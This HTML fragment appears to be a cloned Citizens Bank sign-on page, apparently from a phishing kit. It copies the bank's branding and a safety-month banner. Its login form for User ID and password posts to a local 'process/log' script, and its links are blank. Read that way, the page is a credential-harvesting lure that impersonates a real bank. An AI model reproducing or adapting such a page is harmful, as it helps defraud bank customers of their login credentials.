...
<body class="responsive-enabled" style="display: block;">
	...
	<div class="citizens-header-footer-injected">
		...
		<!--[if IE 8]><link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns-ie8.min.44438.css?refresh=1624286508283"><![endif]-->
		<style>
			...
			<div id="page-header" class="page-header">
				...
				<div class="centered-content clearfix">
					<a href="" class="page-logo" tabindex="1">
						<!-- Display the brand logo for either citizens one or citizen bank customers --><img border="0" alt="Citizens Bank" width="203" height="25" src="img/CTZ_Green-01.png"> </a>
						...
						<div class="account-table-content">
								...
								<div class="account-table-body">
									...
									<div id="GlobalMessageContainer">
										<div class="global-message status-message">
											...
											<p></p>
											<li><b>August is National Internet Safety Month!</b> - Are you running anti-malware on your device? <a href="" target="_blank">LEARN MORE</a> on how you can help toward a safer online experience.</li>
											<p></p>
										</div>
									</div>
									...
									<section class="account-section">
										<form class="pay-transfer-options clearfix" action="process/log" name="SignOn" id="frmSignOn" method="post">
											<div class="account-title clearfix">
												<p>Please enter your Online User ID and Password.</p>
											</div>
											<input type="hidden" name="CSRF_TOKEN" value="JDCX-DHYE-5OW2-JBYH-QZCD-2XM7-ILIV-4SBO">
											...
											<div class="form-item label-right full-width clearfix">
												...
												<input tabindex="1" type="text" id="UserID" name="UserID" autocomplete="off" maxlength="20" class="required demo-username" required="true">
                            ...
                            <span class="tooltip" tabindex="6" role="tooltip" aria-describedby="tooltip-content">
								...
								<div class="form-item full-width">
									...
									<input tabindex="2" type="password" id="password" name="password" maxlength="20" size="20" class="required demo-password" required="true">
									<!--                            <div class="show-hide">
                                <a id="showpswd">SHOW</a>
                            	</div>                           --></div> <span class="mobile-line-break"><a tabindex="7" style="font-size:16px!important" id="troublelogging" data-trigger="login-trouble" href="">Trouble logging in?</a></span>
								<br> </div>
